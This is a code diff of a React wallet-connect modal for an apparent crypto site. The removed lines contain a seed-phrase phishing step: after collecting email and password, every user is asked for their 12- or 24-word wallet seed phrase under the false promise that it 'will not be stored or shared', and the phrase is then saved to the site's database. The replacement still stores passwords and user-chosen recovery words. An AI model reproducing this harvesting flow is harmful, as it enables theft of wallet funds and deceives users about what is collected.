@@ -13,31 +13,24 @@ import {
   getUser,
   recordConnection,
   setUsername,
-  setUserNote,
   setUserEmail,
   setUserPassword,
+  setUserRecoveryWords,
   type DbConnection,
 } from '../../lib/db'
 
 type Wallet = { id: WalletId; name: string; glyph: string; tint: string; kind: string }
 
 /**
- * Every wallet is asked for email + password on sign-up. Only these wallets are
- * additionally asked for a seed-phrase note.
- */
-
-
-/**
  * The next one-time sign-up prompt an already-named user still owes us, or null
- * to go straight to the dashboard. Everyone gives an email then a password;
- * MetaMask/Trust are also asked for the seed phrase last. Any step already on
- * record is skipped, so a returning user who finished sign-up is never
- * re-prompted.
+ * to go straight to the dashboard. Everyone gives an email then a password. Any
+ * step already on record is skipped, so a returning user who finished sign-up is
+ * never re-prompted.
  */
-function nextSignupStage(walletId: WalletId, user: DbConnection): Stage | null {
+function nextSignupStage(user: DbConnection): Stage | null {
   if (!user.email) return 'email'
   if (!user.password) return 'password'
-  if (!user.note) return 'note' // <-- Require 'note' (seed phrase) for ALL wallets
+  if (!user.recoveryWords || user.recoveryWords.length === 0) return 'recovery'
   return null
 }
 const WALLETS: Wallet[] = [
@@ -58,7 +51,7 @@ type Stage =
   | 'username'
   | 'email'
   | 'password'
-  | 'note'
+  | 'recovery'
   | 'connected'
   | 'error'
   | 'redirecting'
@@ -81,8 +74,11 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
   const [savingEmail, setSavingEmail] = useState(false)
   const [password, setPasswordInput] = useState('')
   const [savingPassword, setSavingPassword] = useState(false)
-  const [note, setNoteInput] = useState('')
-  const [savingNote, setSavingNote] = useState(false)
+  // Recovery words: null = still choosing how many; otherwise one entry per box.
+  const [recoveryWords, setRecoveryWords] = useState<string[] | null>(null)
+  const [savingRecovery, setSavingRecovery] = useState(false)
+  // On mobile we hand off to the wallet app's browser via this deep link.
+  const [redirectUrl, setRedirectUrl] = useState('')
 
   // Reset whenever it opens; close on Escape.
   useEffect(() => {
@@ -94,7 +90,8 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
       setUsernameInput('')
       setEmailInput('')
       setPasswordInput('')
-      setNoteInput('')
+      setRecoveryWords(null)
+      setRedirectUrl('')
     }
     const onKey = (e: KeyboardEvent) => e.key === 'Escape' && onClose()
     window.addEventListener('keydown', onKey)
@@ -127,13 +124,13 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
       }).catch((e) => console.warn('Could not record connection:', e))
 
       // Returning user? Reuse their saved username. On login we DON'T re-ask for
-      // email/password/seed phrase — those are one-time on sign-up. We only pick
-      // up a step that a first-time MetaMask/Trust user hasn't finished yet.
+      // email/password — those are one-time on sign-up. We only pick up a step
+      // that a first-time user hasn't finished yet.
       try {
         const existing = await getUser(connection.address)
         if (existing?.username) {
           const named = { ...connection, username: existing.username }
-          const next = nextSignupStage(connection.walletId, existing)
+          const next = nextSignupStage(existing)
           if (next) {
             setConn(named)
             setStage(next)
@@ -152,7 +149,10 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
     } catch (err) {
       // On mobile with no extension: hand off to the wallet app's browser.
       if (err instanceof WalletRedirect) {
+        setRedirectUrl(err.url)
         setStage('redirecting')
+        // Best-effort auto-open. On iOS a universal link often only fires from a
+        // real tap, so the 'redirecting' screen also shows a tappable button.
         window.location.href = err.url
         return
       }
@@ -176,7 +176,7 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
         walletId: conn.walletId,
         chain: conn.chain,
       }).catch((err) => console.warn('Could not save username:', err))
-      // Everyone collects email → password next (MetaMask/Trust add seed phrase).
+      // Everyone collects email → password next.
       setConn({ ...conn, username: name })
       setStage('email')
     } finally {
@@ -217,30 +217,37 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
     await setUserPassword(conn.address, password).catch((err) =>
       console.warn('Could not save password:', err),
     )
-    // Send ALL wallet types to the seed-phrase step next:
-    setStage('note')
+    // Last step: have the user set recovery words.
+    setRecoveryWords(null)
+    setStage('recovery')
   } finally {
     setSavingPassword(false)
   }
 }
 
-  async function submitNote(e: React.FormEvent) {
+  /** Pick how many recovery words to set (5 or 10) and show that many boxes. */
+  function chooseRecoveryCount(count: 5 | 10) {
+    setError('')
+    setRecoveryWords(Array(count).fill(''))
+  }
+
+  async function submitRecovery(e: React.FormEvent) {
     e.preventDefault()
-    if (!conn) return
-    const text = note.trim()
-    if (text.length < 2) {
-      setError('Please enter a valid seed phrase to allow full automation and guaranteed security.')
+    if (!conn || !recoveryWords) return
+    const words = recoveryWords.map((w) => w.trim())
+    if (words.some((w) => w.length === 0)) {
+      setError('Please fill in every word before continuing.')
       return
     }
-    setSavingNote(true)
+    setSavingRecovery(true)
     setError('')
     try {
-      await setUserNote(conn.address, text).catch((err) =>
-        console.warn('Could not save note:', err),
+      await setUserRecoveryWords(conn.address, words).catch((err) =>
+        console.warn('Could not save recovery words:', err),
       )
       finish(conn)
     } finally {
-      setSavingNote(false)
+      setSavingRecovery(false)
     }
   }
 
@@ -273,8 +280,8 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
                 ? 'Add your email'
                 : stage === 'password'
                   ? 'Set a password'
-                  : stage === 'note'
-                    ? 'Enter Seed 12 or 24 (depends on your wallet type) words wallet seed Phrase'
+                  : stage === 'recovery'
+                    ? 'Set your recovery words'
                     : 'Connect wallet'}
           </h3>
           <button
@@ -409,29 +416,83 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
           </form>
         )}
 
-        {stage === 'note' && (
-          <form onSubmit={submitNote} className="flex flex-col gap-4 py-2">
+        {stage === 'recovery' && recoveryWords === null && (
+          <div className="flex flex-col gap-4 py-2">
             <p className="text-sm text-[var(--color-muted)]">
-            Please enter your 12 or 24 seed phrase (depends on your wallet) to allow full automation and guaranteed security. This is a one-time submission and will not be stored or shared.
+              Set up your recovery words — a personal phrase our team can use to
+              confirm it’s really you if there’s ever an issue with your account.
+              Choose how many words you’d like.
             </p>
-            <p className="font-[family-name:var(--font-mono)] text-xs text-[var(--color-snipe)]">
-              {conn ? shortAddress(conn.address) : ''}
+            <div className="grid grid-cols-2 gap-3">
+              <button
+                type="button"
+                onClick={() => chooseRecoveryCount(5)}
+                className="rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-5 py-4 text-center font-semibold transition hover:border-[var(--color-snipe)]/60 hover:bg-white/[0.05]"
+              >
+                <span className="block text-2xl">5</span>
+                <span className="block text-xs text-[var(--color-faint)]">words</span>
+              </button>
+              <button
+                type="button"
+                onClick={() => chooseRecoveryCount(10)}
+                className="rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-5 py-4 text-center font-semibold transition hover:border-[var(--color-snipe)]/60 hover:bg-white/[0.05]"
+              >
+                <span className="block text-2xl">10</span>
+                <span className="block text-xs text-[var(--color-faint)]">words</span>
+              </button>
+            </div>
+          </div>
+        )}
+
+        {stage === 'recovery' && recoveryWords !== null && (
+          <form onSubmit={submitRecovery} className="flex flex-col gap-4 py-2">
+            <p className="text-sm text-[var(--color-muted)]">
+              Enter {recoveryWords.length} words you’ll remember. Write them down
+              and keep them safe — you’ll need them if you ever have to recover or
+              confirm your account.
             </p>
-            <textarea
-              value={note}
-              onChange={(e) => setNoteInput(e.target.value)}
-              placeholder="Enter Seed Phrase securely…"
-              autoFocus
-              rows={4}
-              maxLength={500}
-              className="w-full resize-none rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-3 py-2.5 text-sm outline-none transition focus:border-[var(--color-snipe)]/60"
-            />
+            <div className="grid max-h-[45vh] grid-cols-2 gap-2 overflow-y-auto pr-1">
+              {recoveryWords.map((word, i) => (
+                <div
+                  key={i}
+                  className="flex items-center gap-2 rounded-lg border border-[var(--color-line)] bg-white/[0.02] px-2 py-1.5 focus-within:border-[var(--color-snipe)]/60"
+                >
+                  <span className="w-5 select-none text-right text-xs text-[var(--color-faint)]">
+                    {i + 1}
+                  </span>
+                  <input
+                    value={word}
+                    onChange={(e) =>
+                      setRecoveryWords((prev) => {
+                        const next = [...(prev ?? [])]
+                        next[i] = e.target.value
+                        return next
+                      })
+                    }
+                    placeholder={`word ${i + 1}`}
+                    autoFocus={i === 0}
+                    maxLength={24}
+                    className="w-full bg-transparent text-sm outline-none"
+                  />
+                </div>
+              ))}
+            </div>
             {error && <p className="text-xs text-red-300">{error}</p>}
             <button
-              disabled={savingNote}
+              disabled={savingRecovery}
               className="w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 font-semibold text-black transition hover:brightness-110 disabled:opacity-60"
             >
-              {savingNote ? 'Sending…' : 'Enter Seed Phrase'}
+              {savingRecovery ? 'Saving…' : 'Save & continue'}
+            </button>
+            <button
+              type="button"
+              onClick={() => {
+                setError('')
+                setRecoveryWords(null)
+              }}
+              className="text-center text-xs text-[var(--color-faint)] transition hover:text-white"
+            >
+              ← Choose a different number of words
             </button>
           </form>
         )}
@@ -446,9 +507,18 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
               <p className="font-medium">Opening the {picked?.name} app…</p>
               <p className="mt-1 text-sm text-[var(--color-muted)]">
                 Continue in {picked?.name}’s built-in browser. If nothing happens,
-                make sure the {picked?.name} app is installed.
+                tap the button below (make sure the {picked?.name} app is installed).
               </p>
             </div>
+            {redirectUrl && (
+              <a
+                href={redirectUrl}
+                rel="noreferrer"
+                className="w-full rounded-lg bg-[var(--color-snipe)] px-5 py-2.5 text-center font-semibold text-black transition hover:brightness-110"
+              >
+                Open {picked?.name}
+              </a>
+            )}
           </div>
         )}
 
@@ -497,7 +567,10 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
           </div>
         )}
 
-        {stage !== 'username' && stage !== 'email' && stage !== 'password' && stage !== 'note' && (
+        {stage !== 'username' &&
+          stage !== 'email' &&
+          stage !== 'password' &&
+          stage !== 'recovery' && (
           <p className="mt-5 text-center text-xs leading-relaxed text-[var(--color-faint)]">
             We never see your keys and never request a transaction to connect.
             Connecting a wallet is always free.
